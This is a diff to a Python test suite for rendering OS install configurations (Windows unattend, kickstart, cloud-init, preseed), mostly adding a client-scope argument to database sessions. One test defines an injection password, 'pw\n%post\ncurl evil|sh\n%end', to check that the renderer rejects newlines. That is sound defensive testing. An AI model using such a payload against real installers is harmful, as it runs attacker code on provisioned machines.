@@ -21,6 +21,7 @@ import yaml
 from sqlalchemy import select
 from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession
 
+from app.core.client_scope import ClientScope
 from app.core.tenancy import org_session
 from app.core.vault import LocalVaultService
 from app.models import AuditEvent, Organization
@@ -89,7 +90,7 @@ async def test_render_windows_produces_valid_xml_with_injected_secrets_and_token
 ) -> None:
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image, profile = await _make_windows_profile(session, vault, org_id, actor_id)
         await session.commit()
 
@@ -125,7 +126,7 @@ async def test_render_windows_is_byte_deterministic(
 ) -> None:
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image, profile = await _make_windows_profile(session, vault, org_id, actor_id)
         await session.commit()
 
@@ -156,7 +157,7 @@ async def test_render_windows_is_now_independent(
 ) -> None:
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image, profile = await _make_windows_profile(session, vault, org_id, actor_id)
         await session.commit()
 
@@ -195,13 +196,13 @@ async def test_render_leaves_no_secret_trace_in_db_audit_or_logs(
 ) -> None:
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image, profile = await _make_windows_profile(session, vault, org_id, actor_id)
         await session.commit()
         profile_id = profile.id
 
     events_before = 0
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         events_before = len(
             (await session.execute(select(AuditEvent).where(AuditEvent.org_id == org_id)))
             .scalars()
@@ -209,7 +210,7 @@ async def test_render_leaves_no_secret_trace_in_db_audit_or_logs(
         )
 
     with caplog.at_level(logging.DEBUG):
-        async with org_session(org_id, engine=app_engine) as session:
+        async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
             image_row = image
             profile_row = (
                 await session.execute(
@@ -233,7 +234,7 @@ async def test_render_leaves_no_secret_trace_in_db_audit_or_logs(
     assert b"adminpw" in rendered
 
     # ... but nowhere else: not in the persisted post_config row
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         row = (
             await session.execute(
                 select(type(profile)).where(
@@ -289,7 +290,7 @@ async def test_render_linux_kickstart_contains_token(
 ) -> None:
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image = await create_image(
             session,
             org_id=org_id,
@@ -334,7 +335,7 @@ async def test_render_linux_cloud_init(
 ) -> None:
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image = await create_image(
             session,
             org_id=org_id,
@@ -380,7 +381,7 @@ async def test_render_linux_preseed(
 ) -> None:
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image = await create_image(
             session,
             org_id=org_id,
@@ -425,7 +426,7 @@ async def test_render_linux_missing_installer_raises(
 ) -> None:
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image = await create_image(
             session,
             org_id=org_id,
@@ -467,7 +468,7 @@ async def test_render_linux_unknown_installer_raises(
 ) -> None:
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image = await create_image(
             session,
             org_id=org_id,
@@ -516,7 +517,7 @@ async def test_render_linux_rejects_newline_in_credential(
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
     evil_password = "pw\n%post\ncurl evil|sh\n%end"
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image = await create_image(
             session,
             org_id=org_id,
@@ -568,7 +569,7 @@ async def test_render_cloudinit_quotes_injected_values(
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
     hostile_password = "sec:ret! #pw with spaces"
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image = await create_image(
             session,
             org_id=org_id,
@@ -619,7 +620,7 @@ async def test_render_linux_is_now_independent(
 ) -> None:
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image = await create_image(
             session,
             org_id=org_id,
@@ -676,7 +677,7 @@ async def test_render_macos_raises(
 ) -> None:
     vault = LocalVaultService(tmp_path / "root.key")
     org_id, actor_id = await _org(admin_engine)
-    async with org_session(org_id, engine=app_engine) as session:
+    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
         image = await create_image(
             session,
             org_id=org_id,
